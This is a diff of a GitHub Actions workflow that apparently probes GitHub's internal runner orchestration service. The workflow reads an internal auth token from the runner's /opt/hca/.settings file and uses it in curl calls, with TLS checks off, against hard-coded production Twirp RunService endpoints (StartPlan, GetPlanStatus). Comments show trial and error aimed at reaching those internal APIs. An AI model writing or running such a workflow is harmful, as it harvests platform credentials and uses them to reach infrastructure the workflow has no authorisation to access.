@@ -1,46 +1,31 @@
-name: Fixed Twirp
+name: eus-01 test
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 3
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
       - run: |
           TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
-          API=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['schedulerApiUrl'],end='')")
           
-          echo "API: $API"
-          
-          # FIXED: add / between v1 and twirp
-          echo "=== StartPlan (Fixed URL) ==="
+          # Try eus-01 explicitly (where we KNOW /v1/twirp works)
+          echo "=== StartPlan (eus-01) ==="
           docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
             curl -sk --connect-timeout 10 \
               -H 'Authorization: Bearer $TOK' \
               -H 'Content-Type: application/json' \
               -d '{\"planId\":\"test\"}' \
-              '${API}/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan'
+              'https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan'
           " 2>&1
           
           echo ""
-          echo "=== GetPlanStatus ==="
+          echo "=== GetPlanStatus (eus-01) ==="
           docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
             curl -sk --connect-timeout 10 \
               -H 'Authorization: Bearer $TOK' \
               -H 'Content-Type: application/json' \
               -d '{\"planId\":\"test\"}' \
-              '${API}/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
-          " 2>&1
-          
-          echo ""
-          echo "=== DebugJob ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --connect-timeout 10 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"test\",\"jobUuid\":\"test\"}' \
-              '${API}/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob'
+              'https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
           " 2>&1
